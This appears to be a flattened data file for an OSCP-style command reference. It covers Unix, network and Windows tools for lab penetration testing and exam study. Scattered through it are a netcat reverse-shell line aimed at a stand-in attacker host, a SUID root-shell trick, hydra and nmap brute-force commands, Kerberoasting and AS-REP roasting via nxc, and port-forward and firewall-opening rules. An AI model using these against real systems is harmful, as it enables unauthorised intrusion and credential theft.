meta.title: OSCP Atlas — command reference
meta.note: Each command: syntax, description, anatomy, origins and use-cases. Add your own to data/atlas.json (see README).

commands.name: awk
commands.description: awk splits each input record into fields, tests a pattern, and runs the associated action. $0 is the whole record, $1.. are the fields, NR is the record number, and -F chooses the field separator.
anatomy: A pattern-action program. A pattern selects records; `{ action }` runs for selected ones. BEGIN and END handle setup and summaries.
$0 is the whole record; $1, $2 are fields; NF is the field count; NR is the record number.
-F sets the field separator; -v name=value passes a value in before the program runs.
`print > path` writes (and may truncate) a file; `system()` runs a shell command — never build it from untrusted fields.

origins.creators: Alfred V. Aho, Peter J. Weinberger, Brian W. Kernighan
origins.where: AT&T Bell Laboratories, Murray Hill, New Jersey
origins.why: A small pattern-action language for scanning records and fields, so common reports needed no full C program.

usecases: smbclient and nmap greppable output both work this way.
The pattern is a regex between slashes.
Useful on a list of sizes.
The quotes are a space between the fields.

commands.name: grep
commands.description: grep prints lines that match a pattern. By default PATTERN is a basic regular expression; -E enables extended regex, -F fixed strings. It is the primary filter in a pipeline.
anatomy: A regex (BRE by default). Anchors ^ $, classes [...], quantifiers * + ?. Quote it to protect it from the shell.
-i ignore case, -r recurse, -n line numbers, -v invert, -c count, -o only the match, -w whole word, -l names only.
-A n / -B n / -C n show lines after / before / around each match.
-E extended regex (no backslashes before + ? | ()), -F literal strings (fast, no regex), -P Perl regex where built in.

origins.why: Named after the ed command g/re/p (global / regular expression / print); extracted into a standalone tool.

usecases: Search for the word password as a fixed string.
-F stops the word being read as a regex. -n prints the line number.
Print files that contain the word, not the lines.
A pattern for an AWS access key id.
-P needs a grep build with it. -E is the fallback.
Two lines of context around each hit.
The password is often the line after the label.
Search files grep would otherwise call binary.

commands.name: find
commands.description: find walks a directory tree and tests each entry against expressions (name, type, permission, time, owner), then acts (-print, -exec). It is the backbone of local enumeration.
anatomy: Where to start (e.g. / or .). find recurses from there.
-name/-iname, -type f|d|l, -perm, -user/-group, -size, -mtime/-newer. Tests AND together by default.
2>/dev/null hides the permission-denied errors you'll get walking /.

origins.why: A general way to locate files by attributes and act on the results, before databases like locate existed.

usecases: The owner filter drops SUID files that are not root.
Files under home modified in the last day.
-mmin -10 is the ten-minute version already in the atlas.
Backups and database dumps sit in this range.
No permission errors in the page
Writable files in the three trees that usually matter.
A script that root runs from one of these is the finding.
SUID files with ls -l so the owner is visible.
The plus form is faster than \; .
Files whose user or group no longer exists.
A service still reading one of these is a lead.
The home directory next to it says which account the key logs into.
Passwords deleted from the live file are often still in the .bak.
Files under /etc whose name contains pass.
Narrower than a walk of the whole disk.
Files whose metadata changed in the last 30 minutes.
-mmin is content. -cmin is metadata. Both are worth a look after you land.
pspy shows the ones that run. This shows the ones you can open.
A link from a root-owned script into a path you can write is the finding. ls shows the target.
Your groups from id decide which of these you can change.
A socket in a world-writable directory is a lead. Most of them are under /run.

commands.name: chmod
commands.description: chmod changes a file's permission bits. MODE is either symbolic (who +/-/= bits) or octal (r=4 w=2 x=1 per owner/group/other), plus the special SUID/SGID/sticky bits.
anatomy: who = u/g/o/a, operator = + add / - remove / = set-exactly, bits = r/w/x (and s,t).
three digits: owner, group, other; each = r(4)+w(2)+x(1). 750 = rwx r-x ---.
u+s = SUID (run as owner), g+s = SGID, +t = sticky (dir: only owner deletes).
-R applies down a tree; be careful — it also sets x on files, not just dirs.

origins.why: The permission model needed a tool to set the owner/group/other access bits that the kernel enforces.

usecases: Adds execute so you can run ./exploit.sh.
Owner rw, group r, others nothing.
= clears the unlisted bits for that set.
Octal when you set the whole thing at once.
Owner-only read/write — ssh refuses world-readable keys.
Sets setuid so `bash -p` later yields a root shell.
Illustrates why SUID-root binaries are dangerous.
ssh refuses a private key that other users can read.
Only the owner can open the directory.
Use the symbolic form when you do not want to clobber the other bits.
Owner can read files and enter directories, without adding write.
Do this on a copy you pulled down, so you can grep it.
SUID on a lab binary you compiled
Set the SUID bit on a binary you just built, on a host you are allowed to change.
The bit does nothing useful unless the owner is a user you want the program to run as. ls -l shows the s.

commands.name: ss
commands.description: ss shows socket statistics — listening and established connections — faster than the older netstat. Flags choose protocol and detail; it answers 'what is listening, and who owns it?'
anatomy: -t TCP, -u UDP, -x Unix sockets, -4/-6 address family.
-l listening only; -a all; without them, established connections.
-n numeric (no DNS/port-name lookups, fast), -p the owning process (needs privilege for others').
columns: state, recv/send-q, local address:port, peer address:port, process.

origins.why: netstat read /proc slowly; ss uses netlink for a faster, richer view and became the modern default.

usecases: Listening TCP and UDP with the process name.
-p needs root to see other users' process names.
State established is the pivot clue.
DNS and SNMP show up here.
The peer address is the host that has a session with you.
Faster when reverse DNS is hanging.
A quick check that the box is a client, a server, or both.

commands.name: nc
commands.description: nc (netcat) reads and writes raw TCP/UDP. It connects to or listens on a port and pipes stdin/stdout across — the Swiss-army knife for shells, transfers and port checks.
anatomy: `nc HOST PORT` connects; `nc -l -p PORT` listens (the shell catcher).
-l listen, -v verbose, -n no DNS, -p port, -u UDP, -w timeout, -e program (if the build has it).
Whatever you feed nc's stdin goes over the socket; whatever arrives comes out stdout — so it moves files and shells alike.

origins.where: original Unix netcat; OpenBSD nc widely shipped
origins.why: A general-purpose network read/write tool to script arbitrary TCP/UDP interactions.

usecases: Foothold routes per service/tech, then catch + stabilise.
Connect out / talk to a port
Many don't; use the fifo form.
use certutil / powershell on the target
Arrow keys/history before you even stabilise.
while true; do rlwrap -cAr nc -lvnp 4444; done

Auto re-opens the catcher when a caught shell drops — lab stability for repeated callbacks. NOTE: no -e here; a listener with -e serves a shell FROM your box (a backdoor) and Kali's OpenBSD nc has no -e. Put -e on the VICTIM: nc ATTACKER 4444 -e /bin/bash.
A hang with no -w is usually a filtered port, not an open banner.
Check one port without sending data.
-z is a scan. -v prints the open or refused result.

commands.name: curl
commands.description: curl makes a client request to a URL. Flags control method, headers, body, output and TLS behaviour. It's the scripting workhorse for web testing and file transfer.
anatomy: -X METHOD, -d data (implies POST), --data-urlencode, -G to put data in the query.
-o file / -O, -s silent, -i include headers, -L follow redirects, -k ignore cert errors.
-v shows the full request/response; -I does a HEAD request.

origins.why: A command-line client to transfer data with URL syntax across many protocols.

commands.name: nmap
commands.description: nmap discovers hosts and probes ports and services. Scan type chooses how ports are tested; scripts (NSE) add detection and light exploitation. It is the first step of enumeration.
anatomy: -p 80,443 specific; -p- all 65535; --top-ports N the most common.
-sS SYN (default, root), -sT connect, -sU UDP, -sn ping-only (host discovery).
-T0..5 timing, --min-rate, -oN/-oA to save results — always keep output.

origins.why: A fast, flexible port scanner and network mapper for auditing and discovery.

usecases: Then -sCV on just the open ones.
Versions + safe NSE on open ports.
Run -p- first to learn the ports.
Guess the OS from the TCP/IP stack.
Needs root + an open & closed port.
Extract open ports to a var
Show only open ports and why.
nmap -p- --min-rate 5000 -oG fast.gnmap $TARGET && grep -oP '\d+(?=/open)' fast.gnmap | paste -sd, - > open_ports.txt
All ports fast, ports saved to a file.
Try the built-in short user and password lists against SSH.
The script file is ssh-brute.nse. Those lists are small.
SSH brute with your own username and password files.
userdb and passdb are the same two arguments on the other brute scripts.
Try usernames and passwords against FTP.
Anonymous login is a separate check. This guesses an account.
Try usernames and passwords against SMB.
A long list can lock accounts. Read the lockout policy first.
Try credentials against HTTP basic or digest authentication.
This is for a 401 challenge. A login form is http-form-brute.
Try credentials against an HTML login form.
Set path to the form page. The script reads the field names from that page.
Try usernames and passwords against MySQL.
A hit is a candidate for mysql -h TARGET.
Try usernames and passwords against SQL Server.
The script name is ms-sql-brute. A hit is a candidate for impacket-mssqlclient.
VNC often has no username. passdb is the list that matters.
Try usernames and passwords against Telnet.
The script has to match the username and password prompts in the banner.
Try usernames and passwords against PostgreSQL.
A hit is a candidate for psql -h TARGET.

commands.name: ssh
commands.description: ssh opens an encrypted session to a remote host for a shell, a single command, port forwards, or file transfer. It authenticates by password or key and is central to pivoting.
anatomy: -i keyfile selects a private key; -o StrictHostKeyChecking=no skips the prompt on throwaway boxes.
ssh user@HOST 'id; hostname' runs remotely and returns.
-L local:host:rport (local->remote), -R rport:host:lport (remote->you), -D port (SOCKS proxy) — the pivot toolkit.
-N no shell (just tunnels), -f background, -v debug the handshake.

origins.creators: Tatu Ylonen (OpenSSH by the OpenBSD team)
origins.why: A secure replacement for telnet/rlogin/rsh after a password-sniffing incident.

usecases: Decision guide: port-forward vs SOCKS vs full-tunnel, by egress.
Pull a remote port to you.
Local forward to an internal host
You listen on 9000. The pivot opens 10.10.20.5:445.
Connect to 127.0.0.1:9000. ssh -fN -L backgrounds the same forward.
The pivot listens on 9001 and sends those connections to your 9001.
Without 0.0.0.0 the listen stays on the pivot's localhost. The SSH server also needs GatewayPorts yes, or the bind is refused.

commands.name: python3
commands.description: python3 runs Python code from a file, a module (-m), or inline (-c). In offsec it serves quick HTTP servers, shell upgrades, one-liners and exploit scripts.
anatomy: -c 'code' runs a string; -m module runs a stdlib/package module; FILE runs a script.
http.server (serve files), pty (TTY upgrade), base64, socket, urllib.
ignores env/user-site and the CWD on sys.path — run untrusted-dir scripts with it.

origins.why: A readable, batteries-included general-purpose language; ubiquitous on Linux targets.

usecases: Serve only on the lab interface.
The address you give the target is the tun0 address.
Turn a dumb shell into a pty.
Then Ctrl-Z, stty raw -echo, fg, and reset.
Format JSON so you can read it.
jq does the same when it is installed.
SHA256 of a file with the standard library.
Fetch a page when curl is missing.
Serve a chosen directory instead of the current one.
Send a POST with the standard library.
requests is not installed on every host. urllib is.
Turn a hex blob into text.
fromhex ignores spaces on current Python.
Use --bind tun0 when the target must be able to reach it.
HTTP GET when curl and nc are both missing.
The 5 is the timeout in seconds.
A SHA1 you can compare with a hash in a file.
sha256 is the same call with sha256.

commands.name: sed
commands.description: sed is a stream editor: it reads input line by line and applies editing commands — most often substitution — then prints the result. Great for transforming text in a pipe.
anatomy: s/pattern/replacement/flags — g = all on the line, i = ignore case, p = print.
a line number or /regex/ before a command limits where it applies (e.g. 2d, /err/d).
-i edits the file itself (keep a backup: -i.bak).
-E for extended regex; & in the replacement is the whole match; \1 a capture group.

origins.why: A non-interactive editor for applying ed-style edits to streams and large files.

usecases: -n suppresses the default print. p prints the range.
Edit the file and keep file.bak.
Do this on a copy, not on the only dump you have.
Useful before you sort a wordlist.
Pull a query value out of a URL list.
The part in parentheses is what prints.

commands.name: base64
commands.description: base64 encodes bytes into text and decodes it back. It makes binary safe to paste through text-only shells and shows up in payloads and tokens.
anatomy: -w0 = no line breaks (one blob, easy to paste); default wraps at 76.
it's reversible and public — never a confidentiality control.

origins.why: Represent arbitrary bytes using 64 printable characters so they survive text channels.

usecases: Move a file through a text shell
Prints one blob to copy from a limited shell.
Decode on the other side with base64 -d.
Writes decoded bytes to a file.
JWT payloads are base64url; shows the claims.
PowerShell and cookies want the single line.
Encode a string with no newline in the input.
printf '%s' avoids the newline echo would add.
Add ; echo if you want a trailing newline on the terminal.
Encode a PowerShell script the way -enc expects.
The charset is UTF-16LE. ASCII base64 will not run.

commands.name: tar
commands.description: tar bundles files into one archive (optionally compressed) and extracts them back. Used for moving directory trees, and infamous for sudo/SUID and wildcard-injection escapes.
anatomy: c create, x extract, t list — exactly one per run.
f FILE (the archive, usually required), v verbose, z gzip, j bzip2, C change dir.
--checkpoint + --checkpoint-action=exec run a command — the basis of wildcard injection; and tar can spawn shells under sudo/SUID.

origins.creators: AT&T Unix (tape archiver); GNU tar by John Gilmore et al.
origins.why: Serialise many files (originally to tape) into a single stream for storage and transfer.

usecases: tar czf - dir | ssh user@T 'tar xzf -'
Gzip a directory into one file.
The name has to match tar tzf, including the directory prefix.
Use this when the other side has tar and not gzip.

commands.name: cut
commands.description: cut selects columns from each line — byte, character or delimiter-separated fields. It's the quick way to pull one field out of structured text.
anatomy: -d sets the delimiter, -f picks field numbers (-f1,3 or -f2-).
one single-character delimiter only; for complex splitting use awk.

origins.why: A tiny tool to extract columns from tabular text without a full awk program.

usecases: The comma is a list. 1-3 is a range.
cut's default delimiter is tab, not spaces.
Use awk when the columns are spaces. Use cut -d' ' only when the spacing is single.

commands.name: sort
commands.description: sort orders lines; paired with uniq it counts and dedupes. Numeric, reverse and key-based sorting make it a staple of log and list processing.
anatomy: -k N sort by field N; -t sets the field separator; -u unique.
sort | uniq -c | sort -rn = frequency count, most common first.

origins.why: Ordering records is a fundamental step for merging, deduping and reporting.

usecases: Sort on the second whitespace-separated field.
The field has to be consistent or the order will look wrong.
-o writes the file. Do not redirect onto an input file.

commands.name: ip
commands.description: ip is the modern tool for interfaces, addresses and routes (replacing ifconfig/route). Objects are addr, link, route, neigh.
anatomy: `ip addr` shows; `ip addr add`, `ip link set eth0 up` change (need privilege).
`ip -br addr` gives a compact one-line-per-interface view.

origins.why: A unified, netlink-based replacement for the ageing ifconfig/route/arp tools.

usecases: sudo ip route add 10.10.20.0/24 dev ligolo
Route a subnet via a tun.
sudo ip link set eth0 up
sudo ip addr add 10.10.10.9/24 dev eth0
sudo ip tuntap add user $USER mode tun ligolo
A second route is a network you might pivot into.
Hosts this box has talked to recently.
Send a subnet via a host you can already reach.
You need a tunnel or a route back, or the packets go nowhere.
ip r shows whether it is gone.
ip link set eth0 up is the change, and it needs root.

commands.name: dig
commands.description: dig queries DNS. It resolves names, inspects specific record types, and can attempt a zone transfer — the start of DNS enumeration.
anatomy: @server picks the resolver; TYPE is A, AAAA, MX, NS, TXT, ANY, AXFR.
+short prints just the answer; +noall +answer trims the sections.
AXFR against an NS that allows it dumps every record — a jackpot.

origins.why: A flexible DNS lookup tool for diagnostics, replacing the older nslookup.

usecases: Dump the whole zone if allowed.
Ask the DC for a full zone transfer.
A refused transfer is normal. A successful one is a hostname map.
Ask for every record type the server will return.
ANY is often ignored. Follow it with A, NS, MX, and SRV.
Those hosts are DCs or the DNS you should query next.
Port 25 on those names is the next check.
Turn an internal IP into a name.
Use the DC as the server. Public resolvers do not know lab PTR records.
Useful in a loop over a name list.
UDP answers truncate. AXFR is TCP anyway, and +tcp helps other queries through a filter.
The target name in the SRV answer is the host to put in /etc/hosts.
Pair this with ntpdate before Kerberos tools.
Ask BIND for its version string.
Windows DNS usually refuses this. A version string is a finding on a Linux resolver.
Look up a name you are allowed to query on the public internet.
Do not send internal lab names to a public resolver.

commands.name: smbclient
commands.description: smbclient is an FTP-like client for SMB/CIFS shares. It lists shares, browses them, and downloads files — core Windows/Samba enumeration.
anatomy: ls, cd, get FILE, mget *, prompt OFF; recurse ON for bulk download.

origins.why: Reverse-engineered SMB client so Unix could talk to Windows file sharing.

usecases: List shares on a chosen SMB port.
Use a forwarded port the same way: -p 9445.
Force SMB3 when the default negotiation fails.
-m SMB2 is already the fallback to try next.
The hash is the NT half only.
Save a full listing so you can grep it later.
Download one file from a subdirectory.
Show size, times, and attributes for one file.
Useful before you pull a huge file.
Use a ticket. The host name must match the ccache.
An IP in the UNC path breaks Kerberos.
Give up after ten seconds on a dead share.
Hangs otherwise, especially through a pivot.

commands.name: ffuf
commands.syntax: ffuf -w WORDLIST -u URL  (FUZZ marks the spot)
commands.description: ffuf is a fast web fuzzer: it substitutes the FUZZ keyword with each wordlist entry and reports responses. Used for directories, vhosts and parameters.
anatomy: put FUZZ where you want substitution — the path, a Host header, a param.
-fc/-fs/-fw filter by code/size/words; -mc match codes. Essential to cut noise.

origins.why: A faster, more flexible fuzzer than gobuster/wfuzz, with powerful matching/filtering.

usecases: Decision guide: fuzz vs crawl vs params vs manual proxy.

commands.name: hydra
commands.syntax: hydra [-l user|-L users] [-p pass|-P passwords] SERVICE://TARGET
commands.description: hydra is an online (network) brute-forcer for login services — SSH, FTP, HTTP forms and more. It tries credentials against a live service.
anatomy: -l/-L single or list of users; -p/-P single or list of passwords.
ssh, ftp, smb, http-get, http-post-form (with a failure marker).
-t threads (lower to avoid lockouts/instability); online brute force is loud and risky.

origins.why: A fast, modular network login cracker supporting many protocols.

usecases: Decision guide: offline hash crack vs online brute/spray, hashcat vs john.
Try combos; stop on a hit.
hydra -l admin -P rockyou.txt TARGET http-post-form '/login:user=^USER^&pass=^PASS^&csrf=X:F=invalid:H=Cookie: s=y'
nxc is usually better for SMB.

commands.name: john
commands.description: John the Ripper cracks password hashes offline. Its *2john helpers turn files (zip, ssh keys, JWTs) into crackable hashes first.
anatomy: ssh2john, zip2john, keepass2john, etc. convert a file into a hash John understands.

origins.why: A fast, extensible offline password cracker with broad hash-format support.

usecases: Decision guide: offline hash crack vs online brute/spray, hashcat vs john.

commands.name: wget
commands.description: wget downloads files over HTTP/HTTPS/FTP non-interactively. It handles retries and recursion, making it the go-to fetcher on a target that has it.
anatomy: -O FILE sets the name; -O- streams to stdout (pipe to bash).
wget is download-focused and recurses; curl is request-focused and scripts APIs.

origins.why: A robust non-interactive downloader that survives flaky links and mirrors sites.

usecases: Some lab servers refuse the default wget agent.
Copy the cookie from the browser.
HTTPS with a lab certificate, no progress bar.
-q is quiet. The certificate flag is the lab cert.
Mirror a directory and do not climb to the parent.
Slow a download on a fragile link.
Check that a URL exists without saving a body.
The exit status is the result.
Download every URL in a file.
Skip the download when the local file is already current.
The server has to support range requests.
Download in the background and log to a file.
Read wget.log to see whether it finished.

commands.name: nxc
commands.description: NetExec (nxc, formerly crackmapexec) sweeps and exploits Windows/AD over SMB, WinRM, LDAP, MSSQL and more — enumerate, spray, and execute at scale.
anatomy: smb, winrm, ldap, mssql, ssh, ftp — the first argument.
-u/-p (lists allowed), -H NTLMHASH for pass-the-hash, --local-auth for local accounts.

origins.why: A swiss-army knife to automate Active Directory assessment across many hosts and protocols.

usecases: Spray to find where it's admin.
nxc smb TARGET -u admin -p pass -x whoami
nxc winrm TARGET -u user -p pass -x whoami
nxc ldap DC -u user -p pass --kerberoasting out.txt
nxc ldap DC -u user -p pass --asreproast out.txt
nxc smb TARGET -u user -p pass -M spider_plus

commands.name: searchsploit
commands.description: searchsploit searches a local copy of Exploit-DB. It finds public exploits by product and version, and can copy or show the code — offline and exam-safe.
anatomy: space-separated terms AND together; -t searches the title only.
-m <id> copies an exploit to the CWD; -x <id> shows its source; -p gives its path.

origins.why: A CLI to the Exploit-DB archive so you can find exploits without a browser.

usecases: Map a CVE to an exploit.
Use this when you want the page rather than the file.
Suggest exploits from an nmap XML file.
Local privilege escalation entries for the kernel.
Then match the version from uname -a.
-e avoids the loose matches -t still includes.
Title search without the denial-of-service entries.
The extension decides the interpreter. The folder says Kali, the target, or an upload.
py php rb pl c sh ps1 jar war

commands.name: gobuster
commands.description: gobuster brute-forces web paths, DNS subdomains and vhosts from a wordlist. A fast, simple alternative to ffuf for directory and name discovery.
anatomy: -u URL, -w wordlist, -x extensions, -t threads, -k skip TLS verify.
-b blacklist status codes; -s whitelist — trim the noise.

origins.why: A fast, dependency-light brute-forcer for directories and DNS written in Go.

usecases: Decision guide: fuzz vs crawl vs params vs manual proxy.
gobuster dir -u http://TARGET -w list -U user -P pass
gobuster dir -u http://$TARGET/api -w common.txt -H 'Authorization: Bearer eyJ...'

commands.name: xxd
commands.description: xxd makes a hex dump of a file (or reverses one back to binary). Essential for inspecting file formats, magic bytes and patching binaries.
anatomy: default = hex dump; -r rebuilds the binary from a hex dump.
-p outputs a continuous hex string (no offsets/ascii).
-l N limits length; -s N seeks to an offset.

origins.why: A convenient hex dumper/patcher usable inside and outside the editor.

usecases: xxd file > f.hex; edit; xxd -r f.hex > file
Turn an xxd dump back into bytes.
The dump has to be in xxd's default format, not -p, unless you also pass -p.
Useful when a local exploit source wants an unsigned char array.

commands.name: openssl
commands.description: openssl is a toolbox for TLS and crypto: inspect certificates, open encrypted sockets, hash and encode, and even stand up a quick listener/client.
anatomy: s_client (connect TLS), x509 (certs), enc (encode/encrypt), passwd (hashes), rand.
s_client -connect host:443 shows the cert chain and allows manual requests.
openssl passwd -6 makes a crypt() hash for /etc/shadow-style entries.

origins.why: A full implementation of SSL/TLS plus a CLI for everyday crypto tasks.

usecases: echo | openssl s_client -connect TARGET:443 2>/dev/null | openssl x509 -noout -text
Key + cert out of a PFX.
Print every certificate the server sends.
The CN and SAN are near the top of each cert.
Use this when the default handshake fails against an old service.
Check a cert against a CA file.
A lab CA will fail this until you pass -CAfile.
Build a CSR from a key you already have.
The CA signs the CSR. This command does not.
Drop -nokeys and add -nodes to also extract the key.
See whether the server offers HTTP/2.
The ALPN line in the output is the answer.

commands.name: socat
commands.description: socat connects two byte streams — sockets, files, PTYs, processes — in any combination. It makes fully-interactive reverse shells and ad-hoc relays.
anatomy: it wires ADDRESS1 <-> ADDRESS2 (e.g. a TCP socket to a PTY running bash).
with PTY it gives a real terminal (job control, tab, Ctrl-C survive).

origins.why: A more capable successor to netcat that relays between many address types.

usecases: Foothold routes per service/tech, then catch + stabilise.
Decision guide: port-forward vs SOCKS vs full-tunnel, by egress.
Beats nc for a real TTY.
Client side of the TLS shell.
History/editing on a basic socat catch.
Relay a port and accept more than one connection.
Without fork the listener exits after one client.
A bind shell with a pty.
Make the cert the encrypted socat listener needs.
Append UDP payloads to a file.
-u is unidirectional. Useful when you are catching a UDP callback.
Windows socat bind-back to a cmd.

anatomy: pre-created machine accts default to password = samaccountname (no $, lowercased)
unauth (test a list) / auth (enumerate then test)

pre2k unauth -d corp.local -dc-ip DC -inputfile computers.txt -output pre2k-hits.txt

The account name includes the dollar sign.
pre2k auth -d corp.local -u user -p pass -dc-ip DC -verbose

commands.name: netsh
commands.syntax: netsh interface portproxy add v4tov4 listenaddress=ADDR listenport=PORT connectaddress=ADDR connectport=PORT
commands.description: netsh interface portproxy is the built-in Windows port forward. It listens on the Windows host and connects onward to an internal address. One port, no uploaded binary. You connect to the Windows host, and that host opens the internal service.
anatomy: listenaddress and listenport are on this Windows host. connectaddress and connectport are what it opens next.
Each add is one forward. A whole subnet is ligolo-ng or chisel, not portproxy.
show all lists the rules. delete removes the one you added. They survive a reboot until deleted.

origins.why: A supported way to relay one TCP port without an extra binary.

usecases: Port forward vs SOCKS vs tun, and the command for each.
This tool is the Windows one-port row.
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=3389 connectaddress=10.10.20.5 connectport=3389
Needs an elevated prompt. Then connect to this host's IP, not to 10.10.20.5, unless a tunnel already reaches that subnet.
Every listen address, listen port, and where it connects.
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=3389
Deletes that listen port. The connect address is not part of the delete.
The rule remains across reboots until it is deleted.
netsh advfirewall firewall add rule name=fwd dir=in action=allow protocol=TCP localport=3389
The portproxy rule does not open the firewall by itself.
Without this, a connection to the Windows host port times out before portproxy sees it.
netsh interface portproxy delete v4tov4 listenport=3389 listenaddress=0.0.0.0
The listen address has to match the add command.
Use this at the end of a lab if you added more than one.
netsh advfirewall firewall add rule name=lab3389 dir=in action=allow protocol=TCP localport=3389
Allow the listen port through the Windows firewall.
The forward does nothing if the firewall drops the listen port.
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9000 connectaddress=10.10.20.5 connectport=445
Forward 9000 on this host to SMB on an internal host.
listenaddress 0.0.0.0 is every interface. Use the lab IP if you want one interface.
Show whether the firewall is on for domain, private, and public.
A portproxy listen port still needs an allow rule if the profile is on.
netsh advfirewall firewall show rule name=all
List the inbound and outbound rules.
Look for an allow on the port you forwarded.
Show the proxy Windows uses for WinHTTP.
Services and some tools follow this even when the browser proxy is empty.
Addresses, gateways, and DNS on each interface.
The lab address is the one you use as a listen address.
Index, state, and name of each IPv4 interface.
Use the index with interface ip set commands.
show all includes other families. This is the one portproxy add writes.
The profile this host is using right now.
The portproxy allow rule has to match this profile.
DNS servers configured on each interface.
Those addresses are resolvers you can query with dig.
show config is the longer form. This is the address list.
netsh advfirewall firewall show rule name=all dir=in
